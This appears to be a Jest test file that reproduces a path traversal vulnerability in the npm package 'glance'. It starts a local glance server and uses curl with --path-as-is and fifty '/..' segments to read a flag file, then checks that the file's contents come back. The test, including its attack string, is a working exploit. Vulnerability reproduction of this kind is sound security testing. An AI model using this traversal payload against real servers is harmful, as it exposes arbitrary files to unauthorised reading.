//
const path = require("path");
const { sleep } = require("sleep");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in glance", (done) => {
    const http = require('http');
    const glance = require('glance');
    const fs = require("fs");
    const { exec } = require("child_process");
    let hostsFile = fs.readFileSync(pathToFlag).toString();

    var g = glance({
        dir: './', // defaults to current working dir
        port: 8969, // defaults to 8080
        indices: [], // use these file names to provide indices
        hideindex: true, // will not provide a directory list if requested
        nodot: true, // will hide dot files from lists and will not serve them
        verbose: true // defaults to false
      })
       
    http
    .createServer(function(req, res) {
        if (/^\/static\//.test(req.url)) {
        return g.serveRequest(req, res)
        }
    }).listen(5309);

    g.start()
 
// listen for read events
    g.on('read', function(req) {
    console.dir(req)
    /* req object of format:
        {
            fullPath: 'requested path'
        , ip: 'remote ip address'
        , method: 'requested method'
        , response: 'response object'
        }
    */
    });

    g.on('error', function(req) {
        console.log('BAD!!!!')
        // stop the glance server
        g.stop()
    })

    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8969${genstr()}"`;

    exec(attack_string, (error, stdout) => {
        expect(stdout).toBe(hostsFile);
        done();
    });
});

